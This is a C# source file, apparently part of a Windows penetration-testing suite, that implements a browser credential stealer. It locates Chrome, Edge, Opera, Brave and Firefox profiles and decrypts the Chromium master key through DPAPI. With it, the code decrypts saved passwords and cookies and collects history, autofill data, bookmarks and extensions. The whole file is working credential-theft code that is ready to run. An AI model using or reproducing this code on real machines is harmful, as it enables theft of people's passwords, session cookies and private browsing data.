using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using EliteWindowsPentestSuite.Core;
using EliteWindowsPentestSuite.Models.Results;
using Microsoft.Extensions.Logging;

namespace EliteWindowsPentestSuite.Modules.CredentialAccess
{
    public class BrowserCredentials
    {
        private readonly ILogger _logger;
        private readonly CryptographyEngine _cryptoEngine;
        private readonly FileSystemManager _fileManager;

        private static readonly Dictionary<BrowserType, BrowserProfile> BROWSER_PROFILES = new()
        {
            {
                BrowserType.Chrome,
                new BrowserProfile
                {
                    Name = "Google Chrome",
                    ProfilePath = @"%LOCALAPPDATA%\Google\Chrome\User Data",
                    LoginDataFile = "Login Data",
                    CookiesFile = "Cookies",
                    LocalStateFile = "Local State",
                    HistoryFile = "History",
                    BookmarksFile = "Bookmarks"
                }
            },
            {
                BrowserType.Edge,
                new BrowserProfile
                {
                    Name = "Microsoft Edge",
                    ProfilePath = @"%LOCALAPPDATA%\Microsoft\Edge\User Data",
                    LoginDataFile = "Login Data",
                    CookiesFile = "Cookies",
                    LocalStateFile = "Local State",
                    HistoryFile = "History",
                    BookmarksFile = "Bookmarks"
                }
            },
            {
                BrowserType.Firefox,
                new BrowserProfile
                {
                    Name = "Mozilla Firefox",
                    ProfilePath = @"%APPDATA%\Mozilla\Firefox\Profiles",
                    LoginDataFile = "logins.json",
                    CookiesFile = "cookies.sqlite",
                    HistoryFile = "places.sqlite",
                    BookmarksFile = "places.sqlite",
                    Key4File = "key4.db"
                }
            },
            {
                BrowserType.Opera,
                new BrowserProfile
                {
                    Name = "Opera",
                    ProfilePath = @"%APPDATA%\Opera Software\Opera Stable",
                    LoginDataFile = "Login Data",
                    CookiesFile = "Cookies",
                    LocalStateFile = "Local State",
                    HistoryFile = "History",
                    BookmarksFile = "Bookmarks"
                }
            },
            {
                BrowserType.Brave,
                new BrowserProfile
                {
                    Name = "Brave Browser",
                    ProfilePath = @"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
                    LoginDataFile = "Login Data",
                    CookiesFile = "Cookies",
                    LocalStateFile = "Local State",
                    HistoryFile = "History",
                    BookmarksFile = "Bookmarks"
                }
            }
        };

        public BrowserCredentials(ILogger logger, CryptographyEngine cryptoEngine, FileSystemManager fileManager)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _cryptoEngine = cryptoEngine ?? throw new ArgumentNullException(nameof(cryptoEngine));
            _fileManager = fileManager ?? throw new ArgumentNullException(nameof(fileManager));
        }

        public async Task<BrowserCredentialsResult> ExtractAsync()
        {
            var result = new BrowserCredentialsResult
            {
                StartTime = DateTime.UtcNow,
                ExecutionId = Guid.NewGuid().ToString()
            };

            try
            {
                _logger.LogInformation($"Starting browser credentials extraction {result.ExecutionId}");

                var extractionTasks = BROWSER_PROFILES.Select(async kvp =>
                {
                    try
                    {
                        var browserResult = await ExtractBrowserDataAsync(kvp.Key, kvp.Value);
                        result.BrowserResults[kvp.Key] = browserResult;
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error extracting {kvp.Value.Name} credentials");
                        result.ProcessingErrors.Add($"{kvp.Value.Name}: {ex.Message}");
                    }
                });

                await Task.WhenAll(extractionTasks);

                result.TotalCredentialsFound = result.BrowserResults.Values.Sum(br => br.SavedPasswords.Count);
                result.TotalCookiesFound = result.BrowserResults.Values.Sum(br => br.Cookies.Count);
                result.TotalHistoryEntriesFound = result.BrowserResults.Values.Sum(br => br.HistoryEntries.Count);
                result.TotalBookmarksFound = result.BrowserResults.Values.Sum(br => br.Bookmarks.Count);

                result.IsSuccessful = result.TotalCredentialsFound > 0;
                result.CompletionTime = DateTime.UtcNow;
                result.Duration = result.CompletionTime - result.StartTime;

                _logger.LogInformation($"Browser extraction {result.ExecutionId} completed: {result.TotalCredentialsFound} credentials");
            }
            catch (Exception ex)
            {
                result.ErrorMessage = ex.Message;
                result.Exception = ex;
                _logger.LogError(ex, $"Browser credentials extraction {result.ExecutionId} failed");
            }

            return result;
        }

        private async Task<BrowserExtractionResult> ExtractBrowserDataAsync(BrowserType browserType, BrowserProfile profile)
        {
            var result = new BrowserExtractionResult
            {
                BrowserType = browserType,
                BrowserName = profile.Name,
                IsInstalled = false
            };

            var expandedPath = Environment.ExpandEnvironmentVariables(profile.ProfilePath);
            if (!Directory.Exists(expandedPath))
            {
                return result;
            }

            result.IsInstalled = true;
            result.InstallPath = expandedPath;

            if (browserType == BrowserType.Firefox)
            {
                await ExtractFirefoxDataAsync(result, profile, expandedPath);
            }
            else
            {
                await ExtractChromiumDataAsync(result, profile, expandedPath);
            }

            return result;
        }

        private async Task ExtractChromiumDataAsync(BrowserExtractionResult result, BrowserProfile profile, string basePath)
        {
            var profileDirs = await GetChromiumProfileDirectoriesAsync(basePath);

            foreach (var profileDir in profileDirs)
            {
                try
                {
                    var masterKey = await ExtractChromiumMasterKeyAsync(basePath);

                    await ExtractChromiumPasswordsAsync(result, profileDir, profile.LoginDataFile, masterKey);
                    await ExtractChromiumCookiesAsync(result, profileDir, profile.CookiesFile, masterKey);
                    await ExtractChromiumHistoryAsync(result, profileDir, profile.HistoryFile);
                    await ExtractChromiumBookmarksAsync(result, profileDir, profile.BookmarksFile);
                    await ExtractChromiumAutofillAsync(result, profileDir, "Web Data");
                    await ExtractChromiumExtensionsAsync(result, profileDir);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error processing Chromium profile: {profileDir}");
                    result.ProcessingErrors.Add($"Profile {Path.GetFileName(profileDir)}: {ex.Message}");
                }
            }
        }

        private async Task<List<string>> GetChromiumProfileDirectoriesAsync(string basePath)
        {
            return await Task.Run(() =>
            {
                var profiles = new List<string>();

                try
                {
                    var defaultProfile = Path.Combine(basePath, "Default");
                    if (Directory.Exists(defaultProfile))
                        profiles.Add(defaultProfile);

                    var directories = Directory.GetDirectories(basePath, "Profile *");
                    profiles.AddRange(directories);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating Chromium profiles");
                }

                return profiles;
            });
        }

        private async Task<byte[]> ExtractChromiumMasterKeyAsync(string basePath)
        {
            try
            {
                var localStatePath = Path.Combine(basePath, "Local State");
                if (!File.Exists(localStatePath)) return null;

                var localStateContent = await File.ReadAllTextAsync(localStatePath);
                var localStateJson = JsonDocument.Parse(localStateContent);

                if (localStateJson.RootElement.TryGetProperty("os_crypt", out var osCryptElement) &&
                    osCryptElement.TryGetProperty("encrypted_key", out var encryptedKeyElement))
                {
                    var encryptedKeyBase64 = encryptedKeyElement.GetString();
                    var encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                    if (encryptedKey.Length > 5 && Encoding.ASCII.GetString(encryptedKey, 0, 5) == "DPAPI")
                    {
                        var keyToDecrypt = encryptedKey.Skip(5).ToArray();
                        return await _cryptoEngine.DecryptDPAPIAsync(keyToDecrypt);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting Chromium master key");
            }

            return null;
        }

        private async Task ExtractChromiumPasswordsAsync(BrowserExtractionResult result, string profileDir, string loginDataFile, byte[] masterKey)
        {
            var loginDataPath = Path.Combine(profileDir, loginDataFile);
            if (!File.Exists(loginDataPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(loginDataPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT origin_url, username_value, password_value, date_created, times_used, date_last_used, action_url, date_password_modified
                    FROM logins";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var passwordBytes = (byte[])reader["password_value"];
                    var decryptedPassword = await DecryptChromiumPasswordAsync(passwordBytes, masterKey);

                    var credential = new BrowserCredentialEntry
                    {
                        Url = reader["origin_url"].ToString(),
                        ActionUrl = reader["action_url"].ToString(),
                        Username = reader["username_value"].ToString(),
                        Password = decryptedPassword,
                        DateCreated = DateTimeFromUnixTimestamp((long)reader["date_created"]),
                        DateLastUsed = DateTimeFromUnixTimestamp((long)reader["date_last_used"]),
                        DatePasswordModified = DateTimeFromUnixTimestamp((long)reader["date_password_modified"]),
                        TimesUsed = Convert.ToInt32(reader["times_used"]),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.SavedPasswords.Add(credential);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task ExtractChromiumCookiesAsync(BrowserExtractionResult result, string profileDir, string cookiesFile, byte[] masterKey)
        {
            var cookiesPath = Path.Combine(profileDir, cookiesFile);
            if (!File.Exists(cookiesPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(cookiesPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, 
                           creation_utc, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme
                    FROM cookies 
                    WHERE host_key LIKE '%.%'
                    ORDER BY creation_utc DESC
                    LIMIT 10000";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var encryptedValue = (byte[])reader["encrypted_value"];
                    var decryptedValue = reader["value"].ToString();

                    if (encryptedValue.Length > 0)
                    {
                        decryptedValue = await DecryptChromiumCookieAsync(encryptedValue, masterKey);
                    }

                    var cookie = new BrowserCookieEntry
                    {
                        Host = reader["host_key"].ToString(),
                        Name = reader["name"].ToString(),
                        Value = decryptedValue,
                        Path = reader["path"].ToString(),
                        ExpiresUtc = DateTimeFromUnixTimestamp((long)reader["expires_utc"]),
                        CreationUtc = DateTimeFromUnixTimestamp((long)reader["creation_utc"]),
                        LastAccessUtc = DateTimeFromUnixTimestamp((long)reader["last_access_utc"]),
                        IsSecure = Convert.ToBoolean(reader["is_secure"]),
                        IsHttpOnly = Convert.ToBoolean(reader["is_httponly"]),
                        HasExpires = Convert.ToBoolean(reader["has_expires"]),
                        IsPersistent = Convert.ToBoolean(reader["is_persistent"]),
                        Priority = reader["priority"].ToString(),
                        SameSite = reader["samesite"].ToString(),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.Cookies.Add(cookie);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task ExtractChromiumHistoryAsync(BrowserExtractionResult result, string profileDir, string historyFile)
        {
            var historyPath = Path.Combine(profileDir, historyFile);
            if (!File.Exists(historyPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(historyPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT url, title, visit_count, typed_count, last_visit_time, hidden
                    FROM urls 
                    WHERE url NOT LIKE 'chrome://%' AND url NOT LIKE 'chrome-extension://%'
                    ORDER BY last_visit_time DESC 
                    LIMIT 10000";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var historyEntry = new BrowserHistoryEntry
                    {
                        Url = reader["url"].ToString(),
                        Title = reader["title"].ToString(),
                        VisitCount = Convert.ToInt32(reader["visit_count"]),
                        TypedCount = Convert.ToInt32(reader["typed_count"]),
                        LastVisitTime = DateTimeFromUnixTimestamp((long)reader["last_visit_time"]),
                        IsHidden = Convert.ToBoolean(reader["hidden"]),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.HistoryEntries.Add(historyEntry);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task ExtractChromiumBookmarksAsync(BrowserExtractionResult result, string profileDir, string bookmarksFile)
        {
            var bookmarksPath = Path.Combine(profileDir, bookmarksFile);
            if (!File.Exists(bookmarksPath)) return;

            try
            {
                var bookmarksContent = await File.ReadAllTextAsync(bookmarksPath);
                var bookmarksJson = JsonDocument.Parse(bookmarksContent);

                if (bookmarksJson.RootElement.TryGetProperty("roots", out var rootsElement))
                {
                    ExtractBookmarksFromJson(rootsElement, result, profileDir);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting Chromium bookmarks");
            }
        }

        private void ExtractBookmarksFromJson(JsonElement element, BrowserExtractionResult result, string profilePath)
        {
            if (element.ValueKind == JsonValueKind.Object)
            {
                foreach (var property in element.EnumerateObject())
                {
                    if (property.Value.ValueKind == JsonValueKind.Object)
                    {
                        ExtractBookmarksFromJson(property.Value, result, profilePath);

                        if (property.Value.TryGetProperty("type", out var typeElement) &&
                            typeElement.GetString() == "url" &&
                            property.Value.TryGetProperty("url", out var urlElement) &&
                            property.Value.TryGetProperty("name", out var nameElement))
                        {
                            var bookmark = new BrowserBookmarkEntry
                            {
                                Name = nameElement.GetString(),
                                Url = urlElement.GetString(),
                                DateAdded = property.Value.TryGetProperty("date_added", out var dateElement)
                                    ? DateTimeFromUnixTimestamp(dateElement.GetInt64())
                                    : DateTime.MinValue,
                                BrowserType = result.BrowserType,
                                ProfilePath = profilePath
                            };

                            result.Bookmarks.Add(bookmark);
                        }
                    }
                    else if (property.Value.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var item in property.Value.EnumerateArray())
                        {
                            ExtractBookmarksFromJson(item, result, profilePath);
                        }
                    }
                }
            }
        }

        private async Task ExtractChromiumAutofillAsync(BrowserExtractionResult result, string profileDir, string webDataFile)
        {
            var webDataPath = Path.Combine(profileDir, webDataFile);
            if (!File.Exists(webDataPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(webDataPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT name, value, count, date_created, date_last_used
                    FROM autofill 
                    ORDER BY count DESC, date_last_used DESC
                    LIMIT 1000";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var autofillEntry = new BrowserAutofillEntry
                    {
                        Name = reader["name"].ToString(),
                        Value = reader["value"].ToString(),
                        Count = Convert.ToInt32(reader["count"]),
                        DateCreated = DateTimeFromUnixTimestamp((long)reader["date_created"]),
                        DateLastUsed = DateTimeFromUnixTimestamp((long)reader["date_last_used"]),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.AutofillEntries.Add(autofillEntry);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task ExtractChromiumExtensionsAsync(BrowserExtractionResult result, string profileDir)
        {
            var extensionsDir = Path.Combine(profileDir, "Extensions");
            if (!Directory.Exists(extensionsDir)) return;

            try
            {
                var extensionDirs = Directory.GetDirectories(extensionsDir);

                foreach (var extensionDir in extensionDirs)
                {
                    var extensionId = Path.GetFileName(extensionDir);
                    var versionDirs = Directory.GetDirectories(extensionDir);

                    foreach (var versionDir in versionDirs)
                    {
                        var manifestPath = Path.Combine(versionDir, "manifest.json");
                        if (File.Exists(manifestPath))
                        {
                            try
                            {
                                var manifestContent = await File.ReadAllTextAsync(manifestPath);
                                var manifestJson = JsonDocument.Parse(manifestContent);

                                var extension = new BrowserExtensionEntry
                                {
                                    Id = extensionId,
                                    Version = Path.GetFileName(versionDir),
                                    Name = manifestJson.RootElement.TryGetProperty("name", out var nameElement)
                                        ? nameElement.GetString() : "Unknown",
                                    Description = manifestJson.RootElement.TryGetProperty("description", out var descElement)
                                        ? descElement.GetString() : "",
                                    ManifestVersion = manifestJson.RootElement.TryGetProperty("manifest_version", out var versionElement)
                                        ? versionElement.GetInt32() : 0,
                                    BrowserType = result.BrowserType,
                                    ProfilePath = profileDir
                                };

                                result.Extensions.Add(extension);
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, $"Error parsing extension manifest: {manifestPath}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting Chromium extensions");
            }
        }

        private async Task ExtractFirefoxDataAsync(BrowserExtractionResult result, BrowserProfile profile, string basePath)
        {
            var profileDirs = await GetFirefoxProfileDirectoriesAsync(basePath);

            foreach (var profileDir in profileDirs)
            {
                try
                {
                    await ExtractFirefoxPasswordsAsync(result, profileDir, profile.LoginDataFile);
                    await ExtractFirefoxCookiesAsync(result, profileDir, profile.CookiesFile);
                    await ExtractFirefoxHistoryAsync(result, profileDir, profile.HistoryFile);
                    await ExtractFirefoxBookmarksAsync(result, profileDir, profile.BookmarksFile);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error processing Firefox profile: {profileDir}");
                    result.ProcessingErrors.Add($"Profile {Path.GetFileName(profileDir)}: {ex.Message}");
                }
            }
        }

        private async Task<List<string>> GetFirefoxProfileDirectoriesAsync(string basePath)
        {
            return await Task.Run(() =>
            {
                var profiles = new List<string>();

                try
                {
                    if (Directory.Exists(basePath))
                    {
                        profiles.AddRange(Directory.GetDirectories(basePath));
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating Firefox profiles");
                }

                return profiles;
            });
        }

        private async Task ExtractFirefoxPasswordsAsync(BrowserExtractionResult result, string profileDir, string loginDataFile)
        {
            var loginsPath = Path.Combine(profileDir, loginDataFile);
            if (!File.Exists(loginsPath)) return;

            try
            {
                var loginsContent = await File.ReadAllTextAsync(loginsPath);
                var loginsJson = JsonDocument.Parse(loginsContent);

                if (loginsJson.RootElement.TryGetProperty("logins", out var loginsArray))
                {
                    foreach (var login in loginsArray.EnumerateArray())
                    {
                        var credential = new BrowserCredentialEntry
                        {
                            Url = login.TryGetProperty("hostname", out var hostnameElement) ? hostnameElement.GetString() : "",
                            ActionUrl = login.TryGetProperty("formSubmitURL", out var actionElement) ? actionElement.GetString() : "",
                            Username = login.TryGetProperty("encryptedUsername", out var usernameElement)
                                ? await _cryptoEngine.DecryptFirefoxPasswordAsync(usernameElement.GetString(), profileDir)
                                : "",
                            Password = login.TryGetProperty("encryptedPassword", out var passwordElement)
                                ? await _cryptoEngine.DecryptFirefoxPasswordAsync(passwordElement.GetString(), profileDir)
                                : "",
                            DateCreated = login.TryGetProperty("timeCreated", out var createdElement)
                                ? DateTimeFromUnixTimestamp(createdElement.GetInt64())
                                : DateTime.MinValue,
                            DateLastUsed = login.TryGetProperty("timeLastUsed", out var lastUsedElement)
                                ? DateTimeFromUnixTimestamp(lastUsedElement.GetInt64())
                                : DateTime.MinValue,
                            DatePasswordModified = login.TryGetProperty("timePasswordChanged", out var modifiedElement)
                                ? DateTimeFromUnixTimestamp(modifiedElement.GetInt64())
                                : DateTime.MinValue,
                            TimesUsed = login.TryGetProperty("timesUsed", out var timesUsedElement) ? timesUsedElement.GetInt32() : 0,
                            BrowserType = result.BrowserType,
                            ProfilePath = profileDir
                        };

                        result.SavedPasswords.Add(credential);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting Firefox passwords");
            }
        }

        private async Task ExtractFirefoxCookiesAsync(BrowserExtractionResult result, string profileDir, string cookiesFile)
        {
            var cookiesPath = Path.Combine(profileDir, cookiesFile);
            if (!File.Exists(cookiesPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(cookiesPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT host, name, value, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly, sameSite
                    FROM moz_cookies 
                    ORDER BY creationTime DESC
                    LIMIT 10000";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var cookie = new BrowserCookieEntry
                    {
                        Host = reader["host"].ToString(),
                        Name = reader["name"].ToString(),
                        Value = reader["value"].ToString(),
                        Path = reader["path"].ToString(),
                        ExpiresUtc = DateTimeFromUnixTimestamp((long)reader["expiry"]),
                        CreationUtc = DateTimeFromUnixTimestamp((long)reader["creationTime"]),
                        LastAccessUtc = DateTimeFromUnixTimestamp((long)reader["lastAccessed"]),
                        IsSecure = Convert.ToBoolean(reader["isSecure"]),
                        IsHttpOnly = Convert.ToBoolean(reader["isHttpOnly"]),
                        SameSite = reader["sameSite"].ToString(),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.Cookies.Add(cookie);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task ExtractFirefoxHistoryAsync(BrowserExtractionResult result, string profileDir, string historyFile)
        {
            var historyPath = Path.Combine(profileDir, historyFile);
            if (!File.Exists(historyPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(historyPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT url, title, visit_count, typed, last_visit_date, hidden
                    FROM moz_places 
                    WHERE url NOT LIKE 'about:%' AND url NOT LIKE 'moz-extension://%'
                    ORDER BY last_visit_date DESC 
                    LIMIT 10000";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var historyEntry = new BrowserHistoryEntry
                    {
                        Url = reader["url"].ToString(),
                        Title = reader["title"].ToString(),
                        VisitCount = Convert.ToInt32(reader["visit_count"]),
                        TypedCount = Convert.ToInt32(reader["typed"]),
                        LastVisitTime = DateTimeFromUnixTimestamp((long)reader["last_visit_date"]),
                        IsHidden = Convert.ToBoolean(reader["hidden"]),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.HistoryEntries.Add(historyEntry);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task ExtractFirefoxBookmarksAsync(BrowserExtractionResult result, string profileDir, string bookmarksFile)
        {
            var bookmarksPath = Path.Combine(profileDir, bookmarksFile);
            if (!File.Exists(bookmarksPath)) return;

            var tempPath = await _fileManager.CreateTemporaryCopyAsync(bookmarksPath);

            try
            {
                using var connection = new SQLiteConnection($"Data Source={tempPath}");
                await connection.OpenAsync();

                const string query = @"
                    SELECT p.url, p.title, b.dateAdded
                    FROM moz_bookmarks b
                    JOIN moz_places p ON b.fk = p.id
                    WHERE p.url IS NOT NULL
                    ORDER BY b.dateAdded DESC";

                using var command = new SQLiteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();

                while (await reader.ReadAsync())
                {
                    var bookmark = new BrowserBookmarkEntry
                    {
                        Name = reader["title"].ToString(),
                        Url = reader["url"].ToString(),
                        DateAdded = DateTimeFromUnixTimestamp((long)reader["dateAdded"]),
                        BrowserType = result.BrowserType,
                        ProfilePath = profileDir
                    };

                    result.Bookmarks.Add(bookmark);
                }
            }
            finally
            {
                await _fileManager.DeleteTemporaryFileAsync(tempPath);
            }
        }

        private async Task<string> DecryptChromiumPasswordAsync(byte[] encryptedPassword, byte[] masterKey)
        {
            try
            {
                if (encryptedPassword.Length == 0) return string.Empty;

                if (encryptedPassword.Length >= 3 &&
                    encryptedPassword[0] == 0x01 &&
                    encryptedPassword[1] == 0x00 &&
                    encryptedPassword[2] == 0x00)
                {
                    return await _cryptoEngine.DecryptDPAPIAsync(encryptedPassword.Skip(3).ToArray()).ContinueWith(t => Encoding.UTF8.GetString(t.Result));
                }

                if (encryptedPassword.Length >= 15 &&
                    Encoding.ASCII.GetString(encryptedPassword, 0, 3) == "v10" ||
                    Encoding.ASCII.GetString(encryptedPassword, 0, 3) == "v11")
                {
                    return await _cryptoEngine.DecryptAESGCMAsync(encryptedPassword.Skip(15).ToArray(), masterKey, encryptedPassword.Skip(3).Take(12).ToArray());
                }

                return await _cryptoEngine.DecryptDPAPIAsync(encryptedPassword).ContinueWith(t => Encoding.UTF8.GetString(t.Result));
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error decrypting Chromium password");
                return "[DECRYPTION_FAILED]";
            }
        }

        private async Task<string> DecryptChromiumCookieAsync(byte[] encryptedCookie, byte[] masterKey)
        {
            try
            {
                return await DecryptChromiumPasswordAsync(encryptedCookie, masterKey);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error decrypting Chromium cookie");
                return "[DECRYPTION_FAILED]";
            }
        }

        private DateTime DateTimeFromUnixTimestamp(long timestamp)
        {
            if (timestamp == 0) return DateTime.MinValue;

            try
            {
                if (timestamp > 1000000000000000)
                {
                    return DateTime.FromFileTime(timestamp);
                }
                else if (timestamp > 1000000000000)
                {
                    return DateTimeOffset.FromUnixTimeMilliseconds(timestamp).DateTime;
                }
                else
                {
                    return DateTimeOffset.FromUnixTimeSeconds(timestamp).DateTime;
                }
            }
            catch
            {
                return DateTime.MinValue;
            }
        }
    }

    public class BrowserCredentialsResult : BaseResult
    {
        public string ExecutionId { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime CompletionTime { get; set; }
        public TimeSpan Duration { get; set; }

        public Dictionary<BrowserType, BrowserExtractionResult> BrowserResults { get; set; } = new Dictionary<BrowserType, BrowserExtractionResult>();

        public int TotalCredentialsFound { get; set; }
        public int TotalCookiesFound { get; set; }
        public int TotalHistoryEntriesFound { get; set; }
        public int TotalBookmarksFound { get; set; }

        public List<string> ProcessingErrors { get; set; } = new List<string>();
        public Exception Exception { get; set; }
    }

    public class BrowserExtractionResult
    {
        public BrowserType BrowserType { get; set; }
        public string BrowserName { get; set; }
        public bool IsInstalled { get; set; }
        public string InstallPath { get; set; }

        public List<BrowserCredentialEntry> SavedPasswords { get; set; } = new List<BrowserCredentialEntry>();
        public List<BrowserCookieEntry> Cookies { get; set; } = new List<BrowserCookieEntry>();
        public List<BrowserHistoryEntry> HistoryEntries { get; set; } = new List<BrowserHistoryEntry>();
        public List<BrowserBookmarkEntry> Bookmarks { get; set; } = new List<BrowserBookmarkEntry>();
        public List<BrowserAutofillEntry> AutofillEntries { get; set; } = new List<BrowserAutofillEntry>();
        public List<BrowserExtensionEntry> Extensions { get; set; } = new List<BrowserExtensionEntry>();

        public List<string> ProcessingErrors { get; set; } = new List<string>();
    }

    public class BrowserProfile
    {
        public string Name { get; set; }
        public string ProfilePath { get; set; }
        public string LoginDataFile { get; set; }
        public string CookiesFile { get; set; }
        public string LocalStateFile { get; set; }
        public string HistoryFile { get; set; }
        public string BookmarksFile { get; set; }
        public string Key4File { get; set; }
    }

    public class BrowserCredentialEntry
    {
        public string Url { get; set; }
        public string ActionUrl { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public DateTime DateCreated { get; set; }
        public DateTime DateLastUsed { get; set; }
        public DateTime DatePasswordModified { get; set; }
        public int TimesUsed { get; set; }
        public BrowserType BrowserType { get; set; }
        public string ProfilePath { get; set; }
    }

    public class BrowserCookieEntry
    {
        public string Host { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
        public string Path { get; set; }
        public DateTime ExpiresUtc { get; set; }
        public DateTime CreationUtc { get; set; }
        public DateTime LastAccessUtc { get; set; }
        public bool IsSecure { get; set; }
        public bool IsHttpOnly { get; set; }
        public bool HasExpires { get; set; }
        public bool IsPersistent { get; set; }
        public string Priority { get; set; }
        public string SameSite { get; set; }
        public BrowserType BrowserType { get; set; }
        public string ProfilePath { get; set; }
    }

    public class BrowserHistoryEntry
    {
        public string Url { get; set; }
        public string Title { get; set; }
        public int VisitCount { get; set; }
        public int TypedCount { get; set; }
        public DateTime LastVisitTime { get; set; }
        public bool IsHidden { get; set; }
        public BrowserType BrowserType { get; set; }
        public string ProfilePath { get; set; }
    }

    public class BrowserBookmarkEntry
    {
        public string Name { get; set; }
        public string Url { get; set; }
        public DateTime DateAdded { get; set; }
        public BrowserType BrowserType { get; set; }
        public string ProfilePath { get; set; }
    }

    public class BrowserAutofillEntry
    {
        public string Name { get; set; }
        public string Value { get; set; }
        public int Count { get; set; }
        public DateTime DateCreated { get; set; }
        public DateTime DateLastUsed { get; set; }
        public BrowserType BrowserType { get; set; }
        public string ProfilePath { get; set; }
    }

    public class BrowserExtensionEntry
    {
        public string Id { get; set; }
        public string Name { get; set; }
        public string Version { get; set; }
        public string Description { get; set; }
        public int ManifestVersion { get; set; }
        public BrowserType BrowserType { get; set; }
        public string ProfilePath { get; set; }
    }

    public enum BrowserType
    {
        Chrome,
        Firefox,
        Edge,
        Opera,
        Safari,
        Brave,
        InternetExplorer
    }
}